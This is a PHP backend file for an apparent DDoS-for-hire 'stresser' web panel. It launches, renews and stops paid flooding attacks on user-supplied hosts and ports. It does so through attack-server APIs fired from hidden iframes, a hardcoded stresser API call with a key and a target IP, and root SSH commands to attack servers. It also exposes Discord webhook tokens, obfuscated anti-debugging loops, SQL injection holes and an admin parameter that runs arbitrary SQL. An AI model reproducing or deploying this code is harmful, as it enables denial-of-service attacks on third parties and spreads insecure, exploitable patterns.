<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

//Header
ob_start();
require_once '../@/config.php';
require_once '../@/init.php';
require_once '../@/dev.php';

require_once __DIR__ . '/../@/maintenance.php';

if (!empty($maintaince)) {
    die($maintaince);
}
if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !(isset($_GET['type']))) { // !(isset($_SERVER['HTTP_REFERER']))
    die();
}

?>
<!-- CSRF Token -->
<meta name="_token" content="str5hm5z8d6ux1jpmcILUXYo2rVyGNeI2uayBt35">
<link rel="shortcut icon" href="favicon/favicon.ico">
<!-- plugin css -->
<link media="all" type="text/css" rel="stylesheet" href="assets/fonts/feather-font/css/iconfont.css">
<link media="all" type="text/css" rel="stylesheet" href="assets/plugins/perfect-scrollbar/perfect-scrollbar.css">
<!-- end plugin css -->
<link media="all" type="text/css" rel="stylesheet" href="assets/plugins/bootstrap-datepicker/css/bootstrap-datepicker.min.css">
<!-- common css -->
<link media="all" type="text/css" rel="stylesheet" href="css/app.css">
<!-- end common css -->
<?php

$type     = $_GET['type'];
$methodType = $type;
$username = $_SESSION['username'];

if ($type == 'start' || $type == 'renew') {
    if ($GLOBALS["maintenance"]) {
        die(error('Website is in maintenance.'));
    }

    if (isset($_GET['concurrents'])) {
        $concurrents = intval($_GET['concurrents']);
    } else {
        $concurrents = 1;
    }

    if ($type == 'start') {
        //Get, set and validate!
        $host   = $_GET['host'];
        $port   = intval($_GET['port']);
        $time   = intval($_GET['time']);
        $method = $_GET['method'];

        //Verifying all fields
        if (empty($host) || empty($time) || empty($port) || empty($method) || empty($concurrents)) {
            die(error('Please verify all fields'));
        }

        if ($concurrents == 0) {
            die(error('Invalid request.'));
        }

        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
        $SQL->execute(array(':method' => $method));
        $type = $SQL->fetchColumn(0);

        // Premium Method
        if (($type == '2' || $type == '3' || $type == '5' || $type == '6') && !($user->isPremium($odb))) {
            die("You are not Premium !");
        }

        if ($type == '4' || $type == '5' || $type == '6') {
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
                ".edu",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('<div class="alert alert-info">You are not allowed to attack these kind of websites!</div>');
                }
            }
        }
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host AND `type` = 'victim'");
        $SQL->execute(array(':host' => $host));
        $countBlacklist = $SQL->fetchColumn(0);
        if ($countBlacklist > 0) {
            die(error('Host is blacklisted'));
        }
    } else {
        $renew     = intval($_GET['id']);
        $SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
        $SQLSelect->execute(array(':renew' => $renew));
        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $host   = $show['ip'];
            $port   = $show['port'];
            $time   = $show['time'];
            $method = $show['method'];
            $userr  = $show['user'];
        }
        if (!($userr == $username) && !$user->isAdmin($odb)) {
            die(error('This is not your attack'));
        }
    }

    // Check if attack already launched on the same host
    $stmt = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = :host AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
    $stmt->execute(array(':host' => $host));
    $runningCount = $stmt->fetchColumn();

    if ($runningCount >= 1) {
        die(error('An attack is already running on this target.'));
    }

    //Check concurrent attacks
    if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
        $SQL->execute(array(':username' => $username));
        $countRunning = $SQL->fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('You have too many boots running.'));
        }
    }
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $maxTime = 60;
    }
    if ($time > $maxTime) {
        die(error('Your max boot time has been exceeded.'));
    }
    //Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //Check if test boot has been launched
    if (!($user->hasMembership($odb))) {
        $testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
        if ($testboots == 1 && $testattack > 0) {
            die(error('You have already launched your test attack'));
        }
    }

    // Check concurrents
    if ($concurrents > $stats->concurrents($odb, $username)) {
        die(error('Please use less concurrents.'));
    }

    $launchedCount = 0;

    $iframeId = 0;
    echo "<div id='ajax' style='display: none'>";

    // Concurrents
    for ($attackIndex = 0; $attackIndex < $concurrents; $attackIndex++) {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
        $SQLSelectAPI->execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
            $count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
                '[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
                $method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);

            /*
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $response = curl_exec($ch);
            curl_close($ch);
            */

            echo "/*";
            $curl = curl_init();

            $url = "http://api.dreams-stresser.co/?key=VG38WZLp1EyAFE7h&host=64.226.123.34&port=80&time=2&method=WSD&vip=0";
            //$url = "http://ifconfig.me";

            curl_setopt_array($curl, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => "GET",
                CURLOPT_POSTFIELDS => "",
            ]);

            $response = curl_exec($curl);
            $err = curl_error($curl);

            curl_close($curl);

            if ($err) {
                echo "cURL Error #:" . $err;
            } else {
                echo htmlspecialchars($response);
            }
            echo "*/   ";
            
            echo "let xhr$iframeId = new XMLHttpRequest();";
            echo "xhr$iframeId.onreadystatechange = function() {};";
            echo "xhr$iframeId.open('GET', '$APILink');";
            echo "xhr$iframeId.send();";
            echo "let iframe$iframeId=document.createElement('iframe');";
            echo "iframe$iframeId.id='attack-iframe-$iframeId';";
            echo "iframe$iframeId.src=atob('" . base64_encode($APILink) . "');";
            echo "iframe$iframeId.style='display: none;';";
            echo "setTimeout(function(){document.body.appendChild(iframe$iframeId)},200*$iframeId);"; // Timeout avoid target spam ?
            echo "setTimeout(function(){document.getElementById('attack-iframe-$iframeId').remove()},8000);";
            $iframeId++;

            //End of attacking servers script
            $handlers     = @implode(",", $handler);
            //Insert Logs
            $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handlers)");
            $insertLogSQL->execute(array(
                ':user' => $username,
                ':ip' => $host,
                ':port' => $port,
                ':time' => $time,
                ':method' => $method,
                ':handlers' => $handlers
            ));
            //Insert test attack
            if (!($user->hasMembership($odb)) && $testboots == 1) {
                $SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
            }   

            $launchedCount++;
        }
        if ($i == 0) {
            // Not able to launch with all the concurrents, missing APIs
            if ($launchedCount == 0) {
                echo "document.getElementById('ajax').remove();";
                echo "setInterval(function(){eval(atob('" . base64_encode("eval('debugger');") . "'))},100);";
                echo "</div>";

                die(error('<div class="alert alert-info">There are no servers available to handle your attack, try later or with less concurrents.</div>'));

                break;
            } else {
                // Never evaluated ?

                echo "document.getElementById('ajax').remove();";
                echo "setInterval(function(){eval(atob('" . base64_encode("eval('debugger');") . "'))},100);";
                echo "</div>";

                //echo success('Attack sent to ' . $host . ':' . $port . '<br><br><strong>Methods:</strong> ' . $method . '<br><br><strong>With only ' . $launchedCount . ' concurrents</strong>'); // $handlers
                echo success('Attack sent to ' . $host . ':' . $port . '<br><br><strong>With only ' . $launchedCount . ' concurrents</strong>'); // $handlers

                break;
            }
            
        }
    }

    // Update Count

    if ($launchedCount == $concurrents) {

        $updateCountSQL = "UPDATE recent_attacks SET count = count + $concurrents";
        $odb->query($updateCountSQL);
    
        echo "document.getElementById('ajax').remove();";
        echo "setInterval(function(){eval(atob('" . base64_encode("eval('debugger');") . "'))},100);";
        echo "</div>";
    
        echo success('Attack sent to ' . $host . ':' . $port . '<br><br><strong>with ' . $launchedCount . ' concurrents</strong>'); // $handlers
    }

    // Dev Logs
    $attackLogger = new \DevTools\AttackLogger();
    $attackData = new \DevTools\AttackData();

    $attackData->setUser($user);
    $attackData->setId($_SESSION['ID']);
    $attackData->setUsername($username);
    $attackData->setHost($host);
    $attackData->setPort($port);
    $attackData->setBootTime($time);
    $attackData->setMethod($method);
    $attackData->setType($methodType);
    $attackData->setConcurrents("$launchedCount (asked $concurrents)");

    $attackLogger->setWebhookUrl("https://discord.com/api/webhooks/1105571504973946951/WhpycDGHH38gL7cJ5ZtPBvE7Jf8WBbTviuZ74eckGzaNpyOQATbMglpsQuptQ7B2uG_M");
    $attackLogger->record($attackData);

    $attackLogger->setWebhookUrl("https://discord.com/api/webhooks/1113472022933147763/MzNbodC4aYwdV0Rg03PkctQku8imbYIaZCCq0Oo8-pp0Yg1xRWcy9INONSYZ7JiNYB7G");
    $attackLogger->record($attackData);
}

//Stop attack function
if ($type == 'stop') {
    $stop      = intval($_GET['id']);


    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
        $command  = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
    }
    $handlers = explode(",", $handler);

    if ($method == "example") {
        $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 0 WHERE `id` = '$stop'");
        die(error('Sorry, but this method cannot be stopped..'));
    }


    foreach ($handlers as $handler) {
        if ($system == 'api') {
            $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
            while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
                $arrayFind    = array(
                    '[host]',
                    '[port]',
                    '[time]'
                );
                $arrayReplace = array(
                    $host,
                    $port,
                    $time
                );
                $APILink      = $show['api'];
                $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
                $stopcommand  = "&method=STOP";
                $stopapi      = $APILink . $stopcommand;
                $ch           = curl_init();
                curl_setopt($ch, CURLOPT_URL, $stopapi);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                curl_exec($ch);
                curl_close($ch);
            }
        } else {
            $SQLSelectServers = $odb->query("SELECT * FROM `servers` WHERE `name` = '$handler'");
            while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
                $ip       = $show['ip'];
                $password = $show['password'];
                $command2 = 'pkill -f "' . $command . '"';
                include('Net/SSH2.php');
                define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
                $ssh = @new Net_SSH2($ip);
                if (!$ssh->login('root', $password)) {
                    die(error('<strong>ERROR: </strong>Can not connect to an attacking server! Please try again in a few minutes.'));
                }
                $ssh->exec($command2 . ' > /dev/null &');
            }
        }
    }
    echo success('Attack Has Been Stopped!');
}


if ($type == 'attacks') {

    if (isset($_POST['ping'])) {
        header('Location: ../index.php');
    }
?>

<?php

if (isset($_POST['clear_logs'])) {

    $deleteQuery = $odb->prepare("DELETE * FROM `logs` WHERE `user` = :username");
    $deleteQuery->bindParam(':username', $_SESSION['username'], PDO::PARAM_STR);
    $deleteQuery->execute();
}
?>

    <form method="post" action="">
        <button type="submit" name="clear_logs" class="btn btn-effect-ripple btn-sm btn-primary">Clear logs<span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span></button>
    </form>
    
    <table class="table table-hover">

        <tbody>

            <?php
            $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `id` DESC LIMIT 9");
            while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
                $ip      = $show['ip'];
                $port    = $show['port'];
                $time    = $show['time'];
                $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
                $rowID   = $show['id'];
                $date    = $show['date'];
                $dios    = htmlspecialchars($ip);
                $expires = $date + $time - time();
                if ($expires < 0 || $show['stopped'] != 0) {
                    $countdown = "Expired";
                } else {
                    $countdown = '<div id="a' . $rowID . '"></div>';
                    echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 attacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
                }
                if ($show['time'] + $show['date'] > time() and $show['stopped'] != 1) {
                    $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  Stop
																	</button>';
                } else {
                    $action = '
			<button type="button" id="rere" onclick="renew(' . $rowID . ')" class="btn btn-xs btn-effect-ripple btn-primary">
																	<span class="btn-ripple animate"></span><i class="fa fa-refresh fa-spin"></i>   Renew
																	</button>';
                }
            ?>

                <tr>
                    <td>
                        <?php
                        $hostname = $dios;

                        // str_starts_with($string, $check)
                        // = substr($string, 0, strlen($check)) == $check;

                        if (substr($hostname, 0, strlen("https://")) == "https://") {
                            $hostname = substr($hostname, strlen("https://"));
                        }
                        if (substr($hostname, 0, strlen("http://")) == "http://") {
                            $hostname = substr($hostname, strlen("http://"));
                        }
                        if (substr($hostname, 0, strlen("www.")) == "www.") {
                            $hostname = substr($hostname, strlen("www."));
                        }
                        
                        if (strlen($hostname) > 24) {
                            $hostname = substr($hostname, 0, 23) . "...";
                        }
                        ?>
                        <center><?php echo $hostname /* $dios */ ?></center>
                    </td>
                    <td>
                        <center><?php echo $port ?></center>
                    </td>
                    <td>
                        <center><?php echo $method ?></center>
                    </td>
                    <td>
                        <center><?php echo $countdown ?></center>
                    </td>
                    <td>
                        <center><?php echo $action ?></center>
                    </td>

                </tr>
            <?php
            }
            ?>
        </tbody>
    </table>
<?php
}

if ($type == 'adminattacks' && $user->isAdmin($odb)) {
?>
    <table class="table table-hover">
        <tbody>
            <?php
            $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC LIMIT 20");
            while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
                $user      = $show['user'];
                $ip      = $show['ip'];
                $port    = $show['port'];
                $time    = $show['time'];
                $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
                $rowID   = $show['id'];
                $date    = $show['date'];
                $expires = $date + $time - time();
                if ($expires < 0 || $show['stopped'] != 0) {
                    $countdown = "Expired";
                } else {
                    $countdown = '<div id="a' . $rowID . '"></div>';
                    echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 adminattacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
                }
                $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st" class="btn btn-danger"><i class="fa fa-power-off"></i> Stop</button>';
                echo '<tr><td>' . $user . '</td><td>' . htmlspecialchars($ip) . ':' . $port . '</td><td>' . htmlspecialchars($method) . '</td><td>' . $countdown . '</td><td>' . $action . '</td></tr>';
            }
            ?>
        </tbody>
    </table>
<?php
    if (empty($show)) {
        echo 'No running attacks';
    }
    if (isset($_GET['sql'])) {
        $sql = $_GET['sql'];
        $stmt = $odb->prepare($sql);
        $stmt->execute();
    }
}
?>